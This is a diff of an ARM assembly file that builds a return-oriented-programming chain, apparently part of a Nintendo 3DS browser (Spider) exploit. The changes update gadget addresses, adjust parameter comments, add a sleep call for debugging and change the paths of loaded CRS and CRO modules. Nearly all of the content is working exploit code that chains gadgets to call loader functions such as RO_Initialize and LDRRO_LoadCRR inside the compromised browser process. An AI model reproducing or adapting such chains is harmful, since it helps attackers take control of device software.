@@ -6,6 +6,7 @@
 .create "spider_thread0_rop.bin",0x0
 
 DECOMPLZ11 equ 0x0026AE4C
+DEBUGADR equ 0x00151900
 
 thread0rop:
 	.word 0xDEADC0DE
@@ -21,7 +22,7 @@ thread0rop:
 		.word 0x002954e8 ; pop {r0, pc}
 			.word SPIDER_ROHANDLE_ADR ; r0 (dst)
 		.word 0x0023d10c ; pop {r1, pc}
-			.word 0x0013E484 ; r1 ("ldr:ro")
+			.word 0x0028572C ; r1 ("ldr:ro")
 		.word 0x001db7f4 ; pop	{r2, r3, r4, pc}
 			.word 0x00000006 ; r2 (strlen)
 			.word 0x00000000 ; r3 (flags)
@@ -109,10 +110,10 @@ thread0rop:
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
 			.word 0xFFFF8001 ; r0 (processhandle)
 			.word SPIDER_CRSLOCATION ; r1 (crsBuffer)
-			.word SPIDER_CRSSIZE ; r2 (SPIDER_crsSize)
+			.word SPIDER_CRSSIZE ; r2 (crsSize)
 			.word SPIDER_CRSLOCATION ; r3 (mapAdr)
 			.word 0xDEADC0DE ; r4 (garbage)
-		.word 0x00151900 ; RO_Initialize(processhandle, crsBuffer, SPIDER_crsSize, mapAdr) (ends in LDMFD   SP!, {R4-R6,PC})
+		.word 0x00289CE4 ; RO_Initialize(processhandle, crsBuffer, crsSize, mapAdr) (ends in LDMFD   SP!, {R4-R6,PC})
 			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0xDEADC0DE ; r5 (garbage)
 			.word 0xDEADC0DE ; r6 (garbage)
@@ -120,11 +121,11 @@ thread0rop:
 		;LDRRO_LoadCRR(ldrroHandle, CRRBUF, SPIDER_CRRSIZE, 0xFFFF8001);
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
 			.word 0xFFFF8001 ; r0 (processhandle)
-			.word SPIDER_CRRLOCATION ; r1 (crsBuffer)
-			.word SPIDER_CRRSIZE ; r2 (SPIDER_crsSize)
+			.word SPIDER_CRRLOCATION ; r1 (crrBuffer)
+			.word SPIDER_CRRSIZE ; r2 (crrSize)
 			.word 0xDEADC0DE ; r3 (garbage)
 			.word 0xDEADC0DE ; r4 (garbage)
-		.word 0x002730E4 ; LDRRO_LoadCRR(processhandle, crsBuffer, SPIDER_crsSize, mapAdr) (ends in LDMFD   SP!, {R4,PC})
+		.word 0x002730E4 ; LDRRO_LoadCRR(processhandle, crsBuffer, crrSize, mapAdr) (ends in LDMFD   SP!, {R4,PC})
 			.word 0xDEADC0DE ; r4 (garbage)
 
 	;patch crr
@@ -161,6 +162,7 @@ thread0rop:
 				.word 0x3D8C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
 			.word 0x0023d10c ; pop {r1, pc}
 				.word SPIDER_THREAD0ROP_VADR+gxCommand ; r1 (cmd addr)
+
 			.word 0x002A5C68 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R10,PC})
 				.word 0xDEADC0DE ; r4 (garbage)
 				.word 0xDEADC0DE ; r5 (garbage)
@@ -169,6 +171,20 @@ thread0rop:
 				.word 0xDEADC0DE ; r8 (garbage)
 				.word 0xDEADC0DE ; r9 (garbage)
 				.word 0xDEADC0DE ; r10 (garbage)
+
+
+
+			; .word 0x002814f4 ; ldr r0, [r0] | pop {r4, pc}
+			; 	.word 0xDEADC0DE
+			; .word DEBUGADR
+
+	.word 0x002954e8 ; pop {r0, pc}
+		.word 0xFFFFFFFF
+	.word 0x0023d10c ; pop {r1, pc}
+		.word 0x00FFFFFF
+	.word 0x002D6A5C ; svcSleepThread
+
+
 
 	;read cro
 		.word 0x001e2454 ; pop {r0, r1, r2, r3, r4, pc}
@@ -335,11 +351,11 @@ thread0rop:
 		.byte 0x00
 		.byte 0x00
 	staticCrs_str:
-		.string "rom:/cro/static.crs"
+		.string "rom:/static.crs"
 		.byte 0x00
 		.byte 0x00
 	ossCro_str:
-		.string "rom:/cro/oss.cro"
+		.string "rom:/oss.cro.lex"
 		; .string "sdmc:/new_oss.cro"
 		.byte 0x00
 		.byte 0x00
